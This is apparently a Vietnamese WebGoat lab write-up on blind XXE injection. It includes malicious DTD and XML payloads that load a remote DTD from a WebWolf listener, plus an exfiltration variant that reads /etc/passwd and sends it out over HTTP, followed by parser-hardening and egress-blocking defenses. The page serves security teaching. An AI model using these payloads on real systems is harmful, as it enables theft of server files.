---
title: 1.10 | XXE
slug: XXE-10
description: "Làm thế nào để kiểm tra xem XXE có thành công hay không? 👉 Gửi dữ liệu đến một server do kẻ tấn công kiểm soát."
image: https://tiennhm.github.io/img/docs/database.jpg
sidebar_position: 1
# sidebar_class_name: hidden
tags: 
    - web-security
    - webgoat
    - security-misconfiguration
    - xxe
    - webgoat-2023.8
keywords: [web-security, webgoat, security-misconfiguration, xxe, webgoat-2023.8]
enableComments: true # for Gisqus comments, set to true
draft: false # set to true to hide this post from the site
---

> **Blind XXE Attack**  

## **1. Giới thiệu về Blind XXE**  

**Blind XXE (Blind XML External Entity Injection)** là một biến thể của **XXE** nhưng không trả kết quả trực tiếp ra response của server. Điều này xảy ra khi:  

- **Kết quả không được hiển thị trên trang web** (do output bị ẩn).  
- **Nội dung đọc được chứa ký tự XML không hợp lệ**, khiến parser gặp lỗi.  
- **Firewall hoặc cơ chế bảo vệ ngăn chặn phản hồi trực tiếp**.  

💡 **Làm thế nào để kiểm tra xem XXE có thành công hay không?**  
👉 **Gửi dữ liệu đến một server do kẻ tấn công kiểm soát**.  

**Ví dụ:**  
- Gửi một request **ping đến WebWolf**.  
- Gửi nội dung file **ra ngoài** qua HTTP/DNS request.  


## **2. Cách thực hiện Blind XXE**  

### **1️⃣ Chuẩn bị máy chủ nhận dữ liệu**  
Kẻ tấn công cần có một server để nhận dữ liệu, ví dụ: **WebWolf**.  
WebWolf là công cụ được tích hợp với WebGoat để thực hiện các bài tập tấn công.  

👉 Truy cập WebWolf tại:  
```
http://127.0.0.1:9090/WebWolf/home
```
🔥 **Lưu ý:** Nếu không dùng WebWolf, có thể thay thế bằng một server bất kỳ mà kẻ tấn công kiểm soát.  


### **2️⃣ Tạo file DTD độc hại trên WebWolf**  
Kẻ tấn công tạo file `attack.dtd` trên WebWolf với nội dung:  

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!ENTITY ping SYSTEM "http://127.0.0.1:9090/WebWolf/landing">
```

🛠 **Giải thích**:  
- **`ping`** là một entity tham chiếu đến URL của WebWolf.  
- Nếu server mục tiêu xử lý **DTD từ xa**, nó sẽ gửi request đến WebWolf, xác nhận rằng **XXE Injection hoạt động**.  


### **3️⃣ Gửi Payload Blind XXE**  
Sau khi chuẩn bị xong `attack.dtd`, ta gửi XML sau đến server mục tiêu:  

```xml
<?xml version="1.0"?>
<!DOCTYPE root [
    <!ENTITY % remote SYSTEM "http://127.0.0.1:9090/WebWolf/attack.dtd">
    %remote;
]>
<comment>
  <text>test&ping;</text>
</comment>
```

🛠 **Giải thích**:  
- DTD từ xa (`attack.dtd`) được nạp vào server mục tiêu.  
- `&ping;` sẽ làm server gửi request đến **WebWolf**.  

🔥 **Kết quả mong đợi**:  
- Nếu server dễ bị tấn công, nó sẽ gửi một request HTTP đến **WebWolf**.  
- WebWolf sẽ ghi lại request này trong **Incoming Requests**.  


## **3. Kiểm tra trên WebWolf**  

Mở WebWolf và truy cập **Incoming Requests**. Nếu XXE Injection thành công, ta sẽ thấy log:  

```json
{
  "method" : "GET",
  "path" : "/landing",
  "headers" : {
    "request" : {
      "user-agent" : "Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0"
    }
  },
  "parameters" : {
    "test" : [ "HelloWorld" ]
  },
  "timeTaken" : "1"
}
```

📌 **Kết quả này cho thấy server đã gửi request đến WebWolf, xác nhận rằng XXE Injection có thể thực hiện được.**  


## **4. Ứng dụng Blind XXE để đánh cắp dữ liệu**  

Sau khi xác nhận **Blind XXE hoạt động**, kẻ tấn công có thể:  
1. **Đọc file quan trọng trên server** (VD: `/etc/passwd`).  
2. **Gửi nội dung file ra ngoài** qua HTTP/DNS request.  

🔥 **Ví dụ: Đọc file `/etc/passwd` và gửi nội dung đến WebWolf**  

1️⃣ **Cập nhật file `attack.dtd` trên WebWolf:**  

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY exfiltrate SYSTEM 'http://127.0.0.1:9090/WebWolf/log?data=%file;'>">
%eval;
```

2️⃣ **Gửi XML payload đến server mục tiêu:**  

```xml
<?xml version="1.0"?>
<!DOCTYPE root [
    <!ENTITY % remote SYSTEM "http://127.0.0.1:9090/WebWolf/attack.dtd">
    %remote;
]>
<comment>
  <text>&exfiltrate;</text>
</comment>
```

📌 **Kết quả mong đợi:**  
- Server đọc nội dung `/etc/passwd`.  
- Gửi dữ liệu này đến WebWolf thông qua request HTTP.  
- Kẻ tấn công có thể xem dữ liệu trong WebWolf logs.  


## **5. Cách phòng chống Blind XXE**  

### **1️⃣ Tắt xử lý DOCTYPE và ENTITY trong XML Parser**  
Trong Java:  
```java
DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
factory.setFeature("http://xml.org/sax/features/external-general-entities", false);
factory.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
factory.setFeature("http://apache.org/xml/features/nonvalidating/load-external-dtd", false);
DocumentBuilder builder = factory.newDocumentBuilder();
```

### **2️⃣ Giới hạn quyền truy cập mạng từ XML Parser**  
Nếu ứng dụng có quyền hạn chế, có thể chặn **outbound HTTP requests** để ngăn dữ liệu bị gửi ra ngoài.  

Ví dụ trong **Docker** hoặc **Kubernetes**, có thể cấu hình firewall:  
```bash
iptables -A OUTPUT -p tcp --dport 9090 -j DROP
```

### **3️⃣ Sử dụng JSON thay vì XML**  
Nếu ứng dụng không cần XML, hãy dùng JSON để tránh lỗ hổng XXE:  
```json
{
  "message": "Hello, world!"
}
```

### **4️⃣ Kiểm tra log HTTP để phát hiện XXE bất thường**  
Nếu có request đáng ngờ từ hệ thống gửi đến server không xác định, có thể kiểm tra **log HTTP request** để phát hiện dấu hiệu của XXE.  


## **6. Kết luận**  

- **Blind XXE không hiển thị kết quả trực tiếp** nhưng vẫn có thể **gửi dữ liệu ra ngoài**.  
- **Cách kiểm tra Blind XXE**:  
  1. Sử dụng WebWolf để nhận request.  
  2. Gửi dữ liệu ra ngoài qua HTTP/DNS request.  
- **Kẻ tấn công có thể đánh cắp dữ liệu bí mật** như `/etc/passwd`.  
- **Cách phòng chống**:  
  1. Vô hiệu hóa ENTITY trong XML Parser.  
  2. Chặn HTTP request không mong muốn.  
  3. Sử dụng JSON thay cho XML.  
